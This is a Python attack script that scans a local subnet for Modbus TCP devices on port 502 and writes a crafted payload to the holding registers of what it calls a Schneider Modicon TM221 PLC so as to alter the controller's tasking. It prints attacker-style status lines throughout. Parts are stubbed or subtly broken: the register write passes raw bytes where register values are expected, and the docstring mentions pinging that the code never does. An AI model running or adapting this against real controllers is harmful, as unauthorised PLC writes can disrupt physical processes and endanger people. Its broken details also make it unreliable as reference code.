from pymodbus.client.sync import ModbusTcpClient
from pymodbus.constants import Endian
from pymodbus.payload import BinaryPayloadBuilder, BinaryPayloadDecoder
import socket

def find_plc_ip():
    """
    Detect the PLC IP address based on established network settings.
    Only works when the PLC responds to pings and uses Modbus on port 502.
    """
    print("[*] Scanning the network for available PLCs...")
    base_ip = "192.168.9."  # Modify this range based on your network
    port = 502  # Default Modbus TCP listening port

    for i in range(1, 255):
        ip = f"{base_ip}{i}"
        try:
            # Ping the IP and check for Modbus connection.
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                print(f"[+] Found a Modbus-enabled PLC at: {ip}")
                return ip
            sock.close()
        except socket.error:
            continue
    return None

def modify_tasking(plc_ip):
    """
    Modifies the tasking of the PLC to add/append a high-priority execution block.
    """
    try:
        # Establish connection with the PLC
        print(f"[*] Connecting to PLC at {plc_ip}...")
        client = ModbusTcpClient(plc_ip)
        if not client.connect():
            print("[-] Failed to connect to the PLC. Exiting.")
            return

        # Example: Writing to memory or configuration to append a high-priority task
        # This assumes knowledge of specific memory maps and task modification methods
        # for the Schneider Modicon TM221 PLC. Adjust based on documentation.

        # Construct a new program or modify an existing one
        print("[*] Constructing payload to modify tasking...")
        builder = BinaryPayloadBuilder(byteorder=Endian.Big)
        
        # Example operations - overwriting %M2 memory bit to toggle off, just for example
        builder.add_bits([True, True, False])  # Create a new task toggle
        payload = builder.build()

        # Writing payload to Modbus registers (example register address: 40001)
        response = client.write_registers(40001, payload, unit=1)
        
        if response.isError():
            print(f"[-] Error: {response}")
        else:
            print("[+] Tasking successfully modified.")
        
        # Perform a program download or append
        print("[*] Performing program modification...")
        # Additional implementation for program write based on PLC software documentation

    except Exception as e:
        print(f"[-] Error occurred: {e}")
    finally:
        client.close()
        print("[*] Disconnected from the PLC.")

def main():
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("[-] No PLC found on the network. Exiting.")
        return
    
    # Step 2: Modify the PLC tasking
    modify_tasking(plc_ip)

if __name__ == "__main__":
    main()